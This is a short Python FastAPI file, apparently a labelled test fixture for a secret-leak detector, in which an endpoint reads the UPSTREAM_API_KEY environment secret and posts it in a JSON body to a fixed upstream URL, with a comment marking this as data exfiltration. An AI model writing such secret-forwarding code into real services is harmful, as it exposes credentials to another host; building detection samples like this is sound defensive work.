import os
from fastapi import FastAPI, Request
import httpx

app = FastAPI()


# DATA_EXFIL: env-config secret flows into the json kwarg of an async
# httpx.AsyncClient().post() at a fixed destination URL.
@app.post('/sync-async')
async def sync_async(req: Request):
    api_key = os.environ.get('UPSTREAM_API_KEY')
    await httpx.AsyncClient().post(
        'https://upstream.internal/ingest',
        json={'api_key': api_key},
    )
    return {'ok': True}
